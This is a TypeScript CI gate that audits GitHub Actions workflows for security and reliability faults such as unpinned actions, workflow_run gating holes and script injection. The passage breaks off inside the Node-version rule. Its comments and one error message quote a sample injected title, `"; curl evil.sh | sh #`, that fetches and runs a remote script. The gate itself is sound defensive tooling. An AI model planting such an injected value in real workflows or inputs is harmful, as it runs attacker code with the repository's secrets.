/**
 * CI/CD pipeline gate.
 *
 *   1. timeout-minutes ON EVERY JOB. The default is 360 — six hours of a hung
 *      `npm ci` on a private runner, or of billed minutes on a hosted one.
 *   2. concurrency WITH AN EXPLICIT cancel-in-progress. Omitting the key defaults
 *      it to false, so pushing three commits queues three full runs and the
 *      answer you finally get is for the oldest one.
 *   3. LEAST-PRIVILEGE permissions, DECLARED. With no `permissions:` block the
 *      token inherits the repository default, which for older repos is
 *      read/write on everything — including `contents`, i.e. push access.
 *   4. EVERY `uses:` PINNED TO A COMMIT SHA, with the version in a comment. A tag
 *      is a movable pointer: whoever controls the action repo can repoint `@v5`
 *      at a commit that reads your secrets, and nothing in your workflow changes.
 *   5. THE RUNNER IMAGE PINNED, THROUGH THE MATRIX. `ubuntu-latest` and
 *      `macos-latest` move between major versions on GitHub's schedule, not
 *      yours, and take the preinstalled toolchain with them.
 *   6. `npm ci`, NEVER `npm install`. install rewrites the lockfile to satisfy the
 *      ranges; ci fails instead. Only one of those is a check.
 *   7. `cache: npm` ON setup-node. Not correctness, just minutes.
 *   8. EVERY JOB IN A workflow_run WORKFLOW GATES ON conclusion == 'success', AND
 *      — if it checks out code — ON event == 'push'. Two holes behind one `if:`.
 *      The first: workflow_run fires on `completed`, which includes failure,
 *      cancellation and timeout, so without the conclusion gate a red CI run
 *      deploys exactly as a green one does. Branch protection does not cover
 *      this; protection governs what may MERGE.
 *      The second: workflow_run fires after CI COMPLETES, and CI runs on pull
 *      requests, which have not merged and have not been reviewed. `branches:
 *      [main]` does not save you — it matches workflow_run.head_branch, which for
 *      a PR is the HEAD branch, and a fork's default branch is also called
 *      `main`. So a fork's PR reaches a job carrying THIS repository's token, and
 *      rule 9 then dutifully checks out the fork's commit and runs it.
 *   9. checkout PINNED TO workflow_run.head_sha. Under workflow_run, `github.sha`
 *      is the default branch's HEAD when the event fired, not the commit CI
 *      validated. They differ precisely when commits land fast.
 *  10. IMAGE TAGS IMMUTABLE. `:latest` cannot be traced back to a commit and
 *      leaves a rollback with no earlier tag to name.
 *  11. A BUILDKIT CACHE SCOPE PER IMAGE. Unscoped, every image shares one cache
 *      and each build evicts the others.
 *  12. A JOB THAT PUSHES TO THE REGISTRY DECLARES `packages: write`. The token is
 *      read-only there by default, so the push is rejected after the image has
 *      already been built.
 *  13. SECRETS WRITTEN TO A FILE ARE SCRUBBED IN `if: always()`. On a self-hosted
 *      runner the workspace survives the job.
 *  14. NO UNTRUSTED INPUT SPLICED INTO A `run:` BLOCK. `${{ }}` is textual
 *      substitution performed before the shell sees the script, so a PR titled
 *      `"; curl evil.sh | sh #` runs as the workflow. Pass it through `env:`.
 *  15. CURL-INSTALLED BINARIES PINNED AND CHECKSUMMED. A pinned version names
 *      which release to fetch, not what that release contains.
 *  16. EVERY `npm run` A WORKFLOW INVOKES EXISTS, in the workspace it names.
 *  17. EVERY GATE SCRIPT IS WIRED IN, AT ALL THREE LEVELS: to a package.json
 *      script, into `ci:check`, and to a step in ci.yml. This is the one that
 *      protects the other sixteen — and the one that catches a gate imported into
 *      the tree and never connected to anything, which passes forever because
 *      nothing ever runs it.
 *  18. THE CI NODE VERSION SATISFIES engines.node. Nothing reads `engines` during
 *      a workflow, so the two drift silently: CI proves the app works on the
 *      major IT installs, while `engines` tells contributors and `npm ci` a
 *      different one is enough. Whichever is lower is the one nobody tests.
 *  19. EVERY workflow_run NAME RESOLVES. GitHub matches a workflow's declared
 *      `name:`, not its filename, and a name matching nothing is not an error —
 *      the workflow simply never runs. An image-cleanup workflow waited on
 *      'Build & Push images' against a workflow named 'Build' and had never
 *      fired once. This lived in the Docker gate, which meant a repository with
 *      no Dockerfile never got it; nothing about it is Docker-shaped. A parked
 *      (fully commented-out) workflow declares no name, because it never runs.
 *
 * WHY THIS IS ONE GATE AND NOT TWO. The two families' copies looked like different
 * tools — the full-stack one carried five Docker and self-hosted-deploy rules
 * (10-13, 15) that the desktop one had never needed, and the desktop one carried
 * the matrix runner resolution, the `needs:` condition closure and the
 * engines.node rule that the full-stack one lacked. But none of the five is
 * Docker-specific in its TRIGGER: each fires only on the step shape it is about —
 * a `with.tags`, a `docker/build-push-action@`, a secret redirected into a file, a
 * release-asset URL — and is silent in a repository that has none. So the superset
 * is not a merged gate with switches; it is the union, and each family simply
 * exercises a different half of it.
 *
 * THREE RULES ONE FAMILY WAS MISSING, kept because each is strictly more correct:
 *   - The runner check resolves `runs-on: ${{ matrix.os }}` through the matrix.
 *     The literal-only version skipped exactly the jobs that build native modules.
 *     It also now REPORTS a computed `runs-on` it cannot resolve, rather than
 *     silently passing it — an unreadable runner is an unpinned one as far as
 *     review is concerned.
 *   - The workflow_run gate is followed through `needs:`. One job can carry the
 *     full three-clause condition and everything else depend on it, which is one
 *     place to maintain rather than four. Removing a `needs:` edge shrinks the
 *     closure, so this still fails loudly the moment a job is detached.
 *   - `npm run` is resolved in the workspace it names (`npm -w api run build`).
 *     In a single-package repo `-w` never appears and the rule is unchanged.
 */
import fs from 'node:fs';
import path from 'node:path';

import YAML from 'yaml';

import { REPO_ROOT } from './repo-root.ts';
import { createGateReport, plural } from './report.ts';

/*
 * Parsed YAML is whatever the file says. Only the containers the gate walks through are
 * named; every value it reads is `unknown` and checked where it is read.
 */
type StepInputs = { cache?: unknown; ref?: unknown; tags?: unknown; push?: unknown; [input: string]: unknown };
type Step = { uses?: unknown; run?: unknown; name?: unknown; if?: unknown; with?: StepInputs };
type Permissions = string | Record<string, unknown> | null;
type Job = {
    'runs-on'?: unknown;
    'timeout-minutes'?: unknown;
    'if'?: unknown;
    'needs'?: unknown;
    'permissions'?: Permissions;
    'steps'?: unknown;
    'strategy'?: { matrix?: { include?: unknown; [key: string]: unknown } };
};
type Triggers = { workflow_run?: { workflows?: unknown } | null; [event: string]: unknown };
type WorkflowDoc = {
    name?: unknown;
    on?: unknown;
    /** YAML 1.1 reads a bare `on:` key as the boolean `true`. */
    true?: unknown;
    jobs?: Record<string, Job>;
    concurrency?: string | { 'cancel-in-progress'?: unknown } | null;
    permissions?: Permissions;
    /** A composite action's steps. */
    runs?: Job;
};

export type PipelineOptions = {
    /** Repository root. Defaults to the caller's repo root. */
    root?: string;
    /** Where the `check-*.ts` gate scripts live. Fern's family spells it `scripts/check`, singular. */
    checksDir?: string;
    /** The workflow that must run every gate. */
    ciWorkflow?: string;
};

const WORKFLOW_DIR = '.github/workflows';
const ACTIONS_DIR = '.github/actions';

/** Event payload fields an outsider controls. Each is attacker-supplied text. */
const UNTRUSTED = [
    'github.event.pull_request.title',
    'github.event.pull_request.body',
    'github.event.pull_request.head.ref',
    'github.event.pull_request.head.repo.description',
    'github.event.issue.title',
    'github.event.issue.body',
    'github.event.comment.body',
    'github.event.review.body',
    'github.event.review_comment.body',
    'github.event.discussion.title',
    'github.event.discussion.body',
    'github.event.head_commit.message',
    'github.event.head_commit.author.name',
    'github.event.head_commit.author.email',
    'github.event.workflow_run.head_branch',
    'github.head_ref',
];

const RELEASE_HOSTS = /https?:\/\/(?:github\.com\/[^\s"']+\/releases\/download|[^\s"']*\.sigs\.k8s\.io\/dl)\//;
const USES_LINE = /^[^\S\n]*(?:-[^\S\n]+)?uses:[^\S\n]*(\S+)[^\S\n]*(#.*)?$/gm;
const NPM_RUN = /\bnpm\s+(?:-w\s+(\S+)\s+)?run\s+([\w:@./-]+)/g;

export function checkPipeline(options: PipelineOptions = {}): void {
    const { root = REPO_ROOT, checksDir = 'scripts/checks', ciWorkflow = `${WORKFLOW_DIR}/ci.yml` } = options;

    const report = createGateReport({ name: 'Pipeline' });
    const fail = report.fail;

    const read = (rel: string) => fs.readFileSync(path.join(root, rel), 'utf8');

    const workflowDirPath = path.join(root, WORKFLOW_DIR);
    const workflowFiles = fs.existsSync(workflowDirPath)
        ? fs
              .readdirSync(workflowDirPath)
              .filter((f) => f.endsWith('.yml') || f.endsWith('.yaml'))
              .sort()
        : [];

    if (workflowFiles.length === 0) {
        fail(
            WORKFLOW_DIR,
            'no workflow files found',
            'Every section below would pass vacuously. Did the directory move?',
        );
    }

    type Parsed = { rel: string; src: string; doc: WorkflowDoc };

    const workflows: Parsed[] = [];
    const parked: string[] = [];

    for (const f of workflowFiles) {
        const rel = `${WORKFLOW_DIR}/${f}`;
        const src = read(rel);
        let doc;
        try {
            doc = YAML.parse(src);
        } catch (err) {
            fail(
                rel,
                `is not valid YAML (${String(err instanceof Error ? err.message : err).split('\n')[0] ?? ''})`,
                'This gate cannot inspect it, so every rule below is silently blind to this file. Fix the syntax.',
            );
            continue;
        }
        if (doc !== null && typeof doc === 'object') workflows.push({ rel, src, doc });
        else parked.push(rel);
    }

    const actionsDirPath = path.join(root, ACTIONS_DIR);
    const actionFiles = fs.existsSync(actionsDirPath)
        ? fs
              .readdirSync(actionsDirPath, { withFileTypes: true })
              .filter((e) => e.isDirectory())
              .flatMap((e) => ['action.yml', 'action.yaml'].map((f) => `${ACTIONS_DIR}/${e.name}/${f}`))
              .filter((rel) => fs.existsSync(path.join(root, rel)))
              .sort()
        : [];

    const actions: Parsed[] = [];

    for (const rel of actionFiles) {
        const src = read(rel);
        try {
            const doc = YAML.parse(src);
            if (doc !== null && typeof doc === 'object') actions.push({ rel, src, doc });
        } catch (err) {
            fail(
                rel,
                `is not valid YAML (${String(err instanceof Error ? err.message : err).split('\n')[0] ?? ''})`,
                'Every workflow that calls this action fails at the `uses:` step, before running anything. Fix the syntax.',
            );
        }
    }

    /** YAML 1.1 reads a bare `on:` key as the boolean `true`, so both spellings are checked. */
    const triggersOf = (doc: WorkflowDoc): Triggers => {
        const on = doc.on ?? doc.true;
        return typeof on === 'object' && on !== null ? (on as Triggers) : {};
    };
    const jobsOf = (doc: WorkflowDoc): [string, Job][] => Object.entries(doc.jobs ?? {});
    const stepsOf = (job: Job): Step[] => (Array.isArray(job.steps) ? job.steps : []);
    const isWorkflowRun = (doc: WorkflowDoc): boolean => Boolean(triggersOf(doc)['workflow_run']);
    const lineOf = (src: string, needle: string): number => src.slice(0, src.indexOf(needle)).split('\n').length;

    /** Workflows and composite actions, flattened so a step rule reads both. */
    const stepSources = [
        ...workflows.map(({ rel, src, doc }) => ({ rel, src, jobs: jobsOf(doc) })),
        ...actions.map(({ rel, src, doc }) => ({
            rel,
            src,
            jobs: [[path.basename(path.dirname(rel)), doc.runs ?? {}]] as [string, Job][],
        })),
    ];

    // ── 1. timeout-minutes on every job ─────────────────────────────────────
    for (const { rel, doc } of workflows) {
        for (const [name, job] of jobsOf(doc)) {
            if (job['timeout-minutes'] === undefined) {
                fail(
                    rel,
                    `job \`${name}\` has no timeout-minutes`,
                    'The default is 360. A hung step burns six hours of runner time before anyone finds out, and on a hosted runner that is billed. Scale it to the work: ~5 for checks, 15 for an image build, 40 for anything downloading models.',
                );
            }
        }
    }

    // ── 2. concurrency with an explicit cancel-in-progress ──────────────────
    for (const { rel, doc } of workflows) {
        const group = doc.concurrency;
        if (group === undefined) {
            fail(
                rel,
                'declares no `concurrency`',
                'Three pushes in a minute queue three complete runs, and the last answer to arrive is for the oldest commit. Group by ref (or by branch, for workflow_run) so a newer run supersedes a stale one.',
            );
            continue;
        }
        if (group === null || typeof group !== 'object' || group['cancel-in-progress'] === undefined) {
            fail(
                rel,
                '`concurrency` does not set `cancel-in-progress`',
                'Omitting the key defaults it to false — runs serialise instead of superseding. Set it explicitly either way: true for checks and builds, false for anything destructive like a registry prune, where cancelling half-way leaves the mess it was cleaning.',
            );
        }
    }

    // ── 3. Least-privilege permissions, declared ────────────────────────────
    for (const { rel, doc } of workflows) {
        if (doc.permissions === undefined) {
            fail(
                rel,
                'declares no top-level `permissions`',
                'The GITHUB_TOKEN then inherits the repository default, which on repos created before 2023 is read/write across every scope — including `contents`, meaning any compromised step can push to main. Start from `contents: read` and add only what a job needs.',
            );
            continue;
        }
        if (doc.permissions === 'write-all') {
            fail(
                rel,
                '`permissions: write-all`',
                'That is every scope at once — the opposite of the rule. Enumerate the scopes actually used.',
            );
        }
        for (const [name, job] of jobsOf(doc)) {
            if (job.permissions === 'write-all') {
                fail(
                    rel,
                    `job \`${name}\` sets \`permissions: write-all\``,
                    'Enumerate the scopes this job actually uses.',
                );
            }
        }
    }

    // ── 4. Every `uses:` pinned to a commit SHA ─────────────────────────────
    for (const { rel, src } of [...workflows, ...actions]) {
        for (const m of src.matchAll(USES_LINE)) {
            const [, ref = '', comment] = m;
            if (ref.startsWith('./') || ref.startsWith('docker://')) continue;
            const line = src.slice(0, m.index).split('\n').length;
            const at = ref.lastIndexOf('@');
            const version = at === -1 ? '' : ref.slice(at + 1);
            if (!/^[0-9a-f]{40}$/.test(version)) {
                fail(
                    rel,
                    `line ${line}: \`${ref}\` is pinned to ${version !== '' ? `the tag \`${version}\`` : 'nothing'}`,
                    'A tag is a movable pointer. Whoever controls that repository can repoint it at a commit that exfiltrates every secret this workflow can see, and your file does not change by one character. Pin the 40-character commit SHA.',
                );
            } else if (comment === undefined) {
                fail(
                    rel,
                    `line ${line}: \`${ref}\` is SHA-pinned but has no version comment`,
                    'A bare 40-character hash tells a reader nothing about how old the pin is or whether an upgrade is due. Add `# v5` (or the exact release) beside it.',
                );
            }
        }
    }

    // ── 5. The runner image pinned, through the matrix ──────────────────────
    /**
     * `runs-on` is resolved through the matrix, not just read literally: a matrix
     * build (`runs-on: ${{ matrix.os }}`) is exactly where the image change is not
     * a broken label but a different compiler and a different glibc linked into a
     * shipped binary, and a literal-only check skips precisely those jobs.
     */
    const runnersOf = (job: Job): string[] => {
        const declared = job['runs-on'];
        const values: string[] = [];

        if (typeof declared === 'string' && !declared.includes('${{')) return [declared];

        const matrix = job.strategy?.matrix;
        if (matrix === undefined || typeof declared !== 'string') return values;

        const key = declared.match(/matrix\.([\w-]+)/)?.[1];
        if (key === undefined) return values;

        const listed = matrix[key];
        if (Array.isArray(listed)) values.push(...listed.filter((v) => typeof v === 'string'));
        for (const entry of Array.isArray(matrix.include) ? matrix.include : []) {
            const value = entry?.[key];
            if (typeof value === 'string') values.push(value);
        }
        return values;
    };

    for (const { rel, src, doc } of workflows) {
        for (const [name, job] of jobsOf(doc)) {
            const runners = runnersOf(job);
            if (runners.length === 0 && typeof job['runs-on'] === 'string' && job['runs-on'].includes('${{')) {
                fail(
                    rel,
                    `job \`${name}\` has a computed \`runs-on\` this gate cannot resolve (\`${job['runs-on']}\`)`,
                    'The image is then unchecked. Point it at a matrix key this gate can read, or pin it literally — an unresolvable runner is an unpinned one as far as review is concerned.',
                );
                continue;
            }
            for (const runner of runners) {
                if (/-latest$/.test(runner)) {
                    fail(
                        rel,
                        `job \`${name}\` runs on \`${runner}\` (line ${lineOf(src, runner)})`,
                        "The `-latest` label is repointed at a new major on GitHub's schedule, taking the whole preinstalled toolchain with it — so a green pipeline starts failing, or starts linking a shipped binary against a different glibc, on a day you changed nothing. Pin the image, e.g. `ubuntu-24.04` or `macos-15`.",
                    );
                }
            }
        }
    }

    // ── 6. npm ci, never npm install ────────────────────────────────────────
    for (const { rel, src, jobs } of stepSources) {
        for (const [name, job] of jobs) {
            for (const step of stepsOf(job)) {
                if (typeof step.run !== 'string') continue;
                if (/\bnpm\s+(?:i|install|add)\b(?![^\n]*\s-g\b)/.test(step.run)) {
                    fail(
                        rel,
                        `job \`${name}\` runs \`npm install\` (line ~${lineOf(src, step.run.split('\n')[0] ?? '')})`,
                        'install resolves the ranges afresh and rewrites package-lock.json to match, so CI validates a dependency tree no developer has. `npm ci` installs the lockfile exactly and fails on drift — which is the entire point of running it here.',
                    );
                }
            }
        }
    }

    // ── 7. cache: npm on setup-node ─────────────────────────────────────────
    for (const { rel, jobs } of stepSources) {
        for (const [name, job] of jobs) {
            for (const step of stepsOf(job)) {
                if (typeof step.uses !== 'string' || !step.uses.startsWith('actions/setup-node@')) continue;
                if (step.with?.cache !== 'npm') {
                    fail(
                        rel,
                        `job \`${name}\` sets up Node without \`cache: npm\``,
                        'Every run then re-downloads the whole dependency tree from the registry. Not a correctness problem, just a minute or two of every single run, forever.',
                    );
                }
            }
        }
    }

    // ── 8. workflow_run jobs gate on conclusion, and on event where they check out ──
    /**
     * Followed through `needs:` on purpose. Checking each job's own `if:` has the
     * appeal of a condition you can read rather than derive — but a release
     * workflow is usually built the other way round: one job carries the full gate
     * (conclusion, event, and head_repository) and everything else `needs` it.
     * Demanding the same three-clause condition on every job would mean maintaining
     * it in four places, which is its own drift risk. A job is gated if it, or
     * anything in its transitive `needs` closure, is gated — and removing a
     * `needs:` edge shrinks the closure, so this still fails loudly the moment a
     * job is detached from its gatekeeper.
     */
    for (const { rel, doc } of workflows) {
        if (!isWorkflowRun(doc)) continue;

        const jobs = new Map(jobsOf(doc));
        const needsOf = (job: Job | undefined): string[] => {
            const needs = job?.needs;
            if (Array.isArray(needs)) return needs;
            return typeof needs === 'string' ? [needs] : [];
        };

        /** Every condition governing this job, its own plus every ancestor's. */
        const conditionClosure = (name: string, seen = new Set<string>()): string => {
            if (seen.has(name)) return '';
            seen.add(name);
            const job = jobs.get(name);
            if (job === undefined) return '';
            const own = typeof job.if === 'string' ? job.if : '';
            return [own, ...needsOf(job).map((dep) => conditionClosure(dep, seen))].join(' && ');
        };

        for (const [name, job] of jobs) {
            const cond = conditionClosure(name);
            const via = needsOf(job).length > 0 ? ` (nor anything it needs: ${needsOf(job).join(', ')})` : '';

            if (!/workflow_run\.conclusion\s*==\s*'success'/.test(cond)) {
                fail(
                    rel,
                    `job \`${name}\` does not gate on \`workflow_run.conclusion == 'success'\`${via}`,
                    'workflow_run fires on `completed`, which includes failure, cancellation and timeout. Branch protection does not help — it governs merges. Without this `if`, a red CI run deploys or publishes exactly like a green one.',
                );
            }

            // Only a job that checks out code can be made to execute someone else's
            // commit. A workflow_run job that just flips a draft flag has nothing to
            // load, so demanding the event gate there would be noise.
            const checksOut = stepsOf(job).some(
                (step) => typeof step.uses === 'string' && step.uses.startsWith('actions/checkout@'),
            );
            if (checksOut && !/workflow_run\.event\s*==\s*'push'/.test(cond)) {
                fail(
                    rel,
                    `job \`${name}\` checks out code without gating on \`workflow_run.event == 'push'\`${via}`,
                    "workflow_run fires after CI COMPLETES, not after a merge, and CI runs on unmerged pull requests. `branches: [main]` does not filter them out: it matches workflow_run.head_branch, which for a PR is the head branch, and a fork's default branch is also called `main`. A fork PR therefore reaches this job — which holds this repository's token and secrets — and rule 9 checks out the fork's commit and runs it. Add `github.event.workflow_run.event == 'push'`, which only someone with write access can produce.",
                );
            }
        }
    }

    // ── 9. checkout pinned to workflow_run.head_sha ─────────────────────────
    for (const { rel, doc } of workflows) {
        if (!isWorkflowRun(doc)) continue;
        for (const [name, job] of jobsOf(doc)) {
            for (const step of stepsOf(job)) {
                if (typeof step.uses !== 'string' || !step.uses.startsWith('actions/checkout@')) continue;
                const ref = step.with?.ref;
                if (typeof ref !== 'string' || !ref.includes('workflow_run.head_sha')) {
                    fail(
                        rel,
                        `job \`${name}\` checks out ${typeof ref === 'string' && ref !== '' ? `\`${ref}\`` : 'the default ref'}`,
                        'Under workflow_run the default is the branch HEAD at trigger time, not the commit the upstream run validated. They diverge exactly when commits land quickly — so what ships is code CI never saw. Pass `ref: ${{ github.event.workflow_run.head_sha }}`.',
                    );
                }
            }
        }
    }

    // ── 10. Image tags immutable ────────────────────────────────────────────
    let imagePushes = 0;
    for (const { rel, doc } of workflows) {
        for (const [name, job] of jobsOf(doc)) {
            for (const step of stepsOf(job)) {
                const tags = step.with?.tags;
                if (typeof tags !== 'string') continue;
                imagePushes += 1;
                for (const tag of tags
                    .split(/[\n,]+/)
                    .map((t) => t.trim())
                    .filter(Boolean)) {
                    if (/:latest$/.test(tag)) {
                        fail(
                            rel,
                            `job \`${name}\` pushes \`${tag}\``,
                            'A mutable tag: the running pod cannot be traced back to a commit, and a rollback has no earlier tag to name. Tag with the commit SHA.',
                        );
                    } else if (!/head_sha|github\.sha/.test(tag)) {
                        fail(
                            rel,
                            `job \`${name}\` pushes \`${tag}\`, which does not contain a commit SHA`,
                            'Every deploy must be traceable to the exact commit CI validated. Interpolate `github.event.workflow_run.head_sha` into the tag.',
                        );
                    }
                }
            }
        }
    }

    // ── 11. A BuildKit cache scope per image ────────────────────────────────
    /** scope -> the file and job that already claimed it. */
    const cacheScopes = new Map();
    for (const { rel, doc } of workflows) {
        for (const [name, job] of jobsOf(doc)) {
            for (const step of stepsOf(job)) {
                if (typeof step.uses !== 'string' || !step.uses.startsWith('docker/build-push-action@')) continue;
                const from = step.with?.['cache-from'];
                const to = step.with?.['cache-to'];
                if (typeof from !== 'string' || from === '' || typeof to !== 'string' || to === '') {
                    fail(
                        rel,
                        `job \`${name}\` builds without \`cache-${typeof from === 'string' && from !== '' ? 'to' : 'from'}\``,
                        'Every layer is rebuilt on every push, including any multi-GB download baked into the image. Use `type=gha,scope=<service>`.',
                    );
                    continue;
                }
                const scope = /scope=([^,\s]+)/.exec(to)?.[1];
                if (scope === undefined) {
                    fail(
                        rel,
                        `job \`${name}\` sets \`cache-to\` without a \`scope=\``,
                        'Unscoped, every image shares one cache and each build evicts the others. Give each image its own scope.',
                    );
                    continue;
                }
                if (cacheScopes.has(scope)) {
                    fail(
                        rel,
                        `job \`${name}\` reuses cache scope \`${scope}\` (also ${cacheScopes.get(scope)})`,
                        'Two images writing one scope evict each other every run, so the cache is worse than none — it costs an upload to store what the next build discards.',
                    );
                } else {
                    cacheScopes.set(scope, `${rel} job \`${name}\``);
                }
                const readScope = /scope=([^,\s]+)/.exec(from)?.[1];
                if (from.includes('scope=') && readScope !== scope) {
                    fail(
                        rel,
                        `job \`${name}\` reads cache scope \`${readScope}\` but writes \`${scope}\``,
                        'The build never reads back what it wrote, so the cache is populated and never used.',
                    );
                }
            }
        }
    }

    // ── 12. A job that pushes declares packages: write ──────────────────────
    for (const { rel, doc } of workflows) {
        const top = typeof doc.permissions === 'object' && doc.permissions !== null ? doc.permissions : {};
        for (const [name, job] of jobsOf(doc)) {
            const scoped = typeof job.permissions === 'object' && job.permissions !== null ? job.permissions : null;
            const granted = (scoped ?? top)['packages'];
            const pushes = stepsOf(job).some(
                (s) =>
                    (typeof s.uses === 'string' &&
                        s.uses.startsWith('docker/build-push-action@') &&
                        s.with?.push === true) ||
                    (typeof s.uses === 'string' && s.uses.startsWith('actions/delete-package-versions@')),
            );
            if (pushes && granted !== 'write') {
                fail(
                    rel,
                    `job \`${name}\` writes to the package registry without \`packages: write\``,
                    'The GITHUB_TOKEN is read-only for packages by default, so the push is rejected — after the image has already been built. On a large image that is forty minutes to reach a permissions error.',
                );
            }
        }
    }

    // ── 13. Secrets written to a file are scrubbed in `if: always()` ────────
    for (const { rel, doc } of workflows) {
        for (const [name, job] of jobsOf(doc)) {
            const steps = stepsOf(job);
            const writesSecret = steps.some(
                (s) => typeof s.run === 'string' && /\$\{\{[^}]*\bsecrets\./.test(s.run) && />>?\s*\S/.test(s.run),
            );
            if (!writesSecret) continue;
            const scrubs = steps.some(
                (s) =>
                    typeof s.run === 'string' &&
                    /\brm\b/.test(s.run) &&
                    typeof s.if === 'string' &&
                    s.if.includes('always()'),
            );
            if (!scrubs) {
                fail(
                    rel,
                    `job \`${name}\` writes a secret to a file with no \`if: always()\` cleanup`,
                    'On a self-hosted runner the workspace survives the job, so the file is still there for whatever runs next. The cleanup must be `if: always()` — a failed deploy is the run most likely to leave secrets behind and the one a plain final step never reaches.',
                );
            }
        }
    }

    // ── 14. No untrusted input spliced into a `run:` block ──────────────────
    for (const { rel, src, jobs } of stepSources) {
        for (const [name, job] of jobs) {
            for (const step of stepsOf(job)) {
                if (typeof step.run !== 'string') continue;
                for (const field of UNTRUSTED) {
                    if (!new RegExp(`\\$\\{\\{[^}]*\\b${field.replace(/\./g, '\\.')}\\b`).test(step.run)) continue;
                    fail(
                        rel,
                        `job \`${name}\` interpolates \`${field}\` into a \`run:\` script (line ~${lineOf(src, step.run.split('\n')[0] ?? '')})`,
                        `That expression is substituted into the script text before the shell parses it, so a branch or title of \`"; curl evil.sh | sh #\` executes with this workflow's token and secrets. Bind it through \`env:\` instead and reference "$VAR" — inside env it is a value, not source code.`,
                    );
                }
            }
        }
    }

    // ── 15. curl-installed binaries pinned and checksummed ──────────────────
    for (const { rel, jobs } of stepSources) {
        for (const [name, job] of jobs) {
            for (const step of stepsOf(job)) {
                if (typeof step.run !== 'string' || !RELEASE_HOSTS.test(step.run)) continue;
                const label =
                    typeof step.name === 'string' && step.name !== '' ? `step "${step.name}"` : `job \`${name}\``;
                if (
                    /\$\{?\w*(?:VERSION|_VER)\b/.test(step.run) === false &&
                    /\/v?\d+\.\d+\.\d+\//.test(step.run) === false
                ) {
                    fail(
                        rel,
                        `${label} downloads a release asset from an unpinned URL`,
                        'Without a version in the path it resolves to whatever is newest, so the toolchain changes under a pipeline nobody touched. Pin the version.',
                    );
                }
                if (!/sha256sum|shasum|sha256/i.test(step.run)) {
                    fail(
                        rel,
                        `${label} installs a downloaded binary without verifying a checksum`,
                        'A pinned version names which release to fetch, not what that release contains — release assets can be replaced in place, and this one is piped into /usr/local/bin and then run. Record the sha256 next to the version and check it before installing.',
                    );
                }
            }
        }
    }

    // ── 16. Every `npm run` a workflow invokes exists ───────────────────────
    const rootPkg = JSON.parse(read('package.json'));
    const rootScripts = new Set(Object.keys(rootPkg.scripts ?? {}));

    /** Script names per workspace, by folder AND by package name — `npm -w` accepts either. */
    const wsScripts = new Map();
    for (const ws of rootPkg.workspaces ?? []) {
        const manifest = path.join(root, ws, 'package.json');
        if (!fs.existsSync(manifest)) continue;
        const pkg = JSON.parse(fs.readFileSync(manifest, 'utf8'));
        const names = new Set(Object.keys(pkg.scripts ?? {}));
        wsScripts.set(path.basename(ws), names);
        if (typeof pkg.name === 'string' && pkg.name !== '') wsScripts.set(pkg.name, names);
    }

    for (const { rel, jobs } of stepSources) {
        for (const [name, job] of jobs) {
            for (const step of stepsOf(job)) {
                if (typeof step.run !== 'string') continue;
                for (const [, ws, script = ''] of step.run.matchAll(NPM_RUN)) {
                    const available = ws !== undefined ? wsScripts.get(ws) : rootScripts;
                    if (available === undefined) {
                        fail(
                            rel,
                            `job \`${name}\` runs \`npm -w ${ws} run ${script}\`, but there is no \`${ws}\` workspace`,
                            `Declared workspaces: ${(rootPkg.workspaces ?? []).join(', ')}.`,
                        );
                    } else if (!available.has(script)) {
                        fail(
                            rel,
                            `job \`${name}\` runs \`npm run ${script}\`${ws !== undefined ? ` in \`${ws}\`` : ''}, which is not a script there`,
                            'Renaming a script in package.json is a one-line edit that breaks CI from a file nobody had open. The failure surfaces on the next push, at whatever step happened to reference it.',
                        );
                    }
                }
            }
        }
    }

    // ── 17. Every gate script is wired in, all three levels ─────────────────
    const checksDirPath = path.join(root, checksDir);
    const gateScripts = fs.existsSync(checksDirPath)
        ? fs
              .readdirSync(checksDirPath)
              .filter((f) => f.startsWith('check-') && f.endsWith('.ts'))
              .sort()
              .map((f) => `${checksDir}/${f}`)
        : [];

    if (gateScripts.length === 0) {
        fail(checksDir, 'contains no check-*.ts scripts', 'This section would pass vacuously. Did the directory move?');
    }

    const ciCheck = rootPkg.scripts?.['ci:check'] ?? '';
    if (ciCheck === '') {
        fail(
            'package.json',
            'has no `ci:check` script',
            'It is the one command that runs every gate locally. Without it each gate has to be remembered individually, which is the same as not having them.',
        );
    }

    const ciDoc = workflows.find((w) => w.rel === ciWorkflow);
    if (ciDoc === undefined) {
        fail(ciWorkflow, 'missing', 'Nothing runs the gates on push, so all of them are advisory.');
    }
    const ciRuns =
        ciDoc !== undefined
            ? jobsOf(ciDoc.doc)
                  .flatMap(([, job]) =>
                      stepsOf(job)
                          .map((s) => s.run)
                          .filter((r) => typeof r === 'string'),
                  )
                  .join('\n')
            : '';

    for (const gate of gateScripts) {
        const entry = Object.entries(rootPkg.scripts ?? {}).find(([, cmd]) => String(cmd).includes(gate));
        if (entry === undefined) {
            fail(
                gate,
                'is not invoked by any package.json script',
                'Nothing can run it, so the standard it encodes is enforced by nobody. Add a `<domain>:check` script for it.',
            );
            continue;
        }
        const [scriptName] = entry;
        const escaped = scriptName.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
        if (!new RegExp(`\\bnpm run ${escaped}\\b`).test(ciCheck)) {
            fail(
                'package.json',
                `\`ci:check\` does not run \`${scriptName}\` (${gate})`,
                'The gate exists and is skipped locally. Chain it into ci:check so one command still means "everything".',
            );
        }
        if (ciDoc !== undefined && !new RegExp(`\\bnpm run ${escaped}\\b`).test(ciRuns)) {
            fail(
                ciWorkflow,
                `has no step running \`${scriptName}\` (${gate})`,
                'The gate exists and is skipped on push, so a violation reaches main and is only caught by whoever happens to run ci:check locally.',
            );
        }
    }

    // ── 18. The CI node version satisfies engines.node ──────────────────────
    const enginesNode = rootPkg.engines?.node;

    if (typeof enginesNode !== 'string') {
        fail(
            'package.json',
            'declares no `engines.node`',
            'It is the only statement of which Node majors this app supports, and what `npm ci` checks a contributor against.',
        );
    } else {
        const floor = Number(enginesNode.match(/(\d+)/)?.[1]);

        /** Every `node-version:` a workflow or composite action asks setup-node for. */
        const nodeVersions = new Map();
        for (const { rel, src } of [...workflows, ...actions]) {
            for (const m of src.matchAll(/node-version:\s*'?"?(\d+)/g)) nodeVersions.set(rel, Number(m[1]));
        }

        if (nodeVersions.size === 0) {
            fail(
                ACTIONS_DIR,
                'no `node-version:` found in any workflow or action',
                'Without one setup-node picks whatever the runner image ships, so the tested major changes when the image does.',
            );
        }

        for (const [rel, major] of nodeVersions) {
            if (major < floor) {
                fail(
                    rel,
                    `installs Node ${major}, below the \`engines.node\` floor of ${enginesNode}`,
                    'CI is proving the app works on a major the manifest says is unsupported, and nothing tests the one it claims to require.',
                );
            } else if (major > floor) {
                fail(
                    rel,
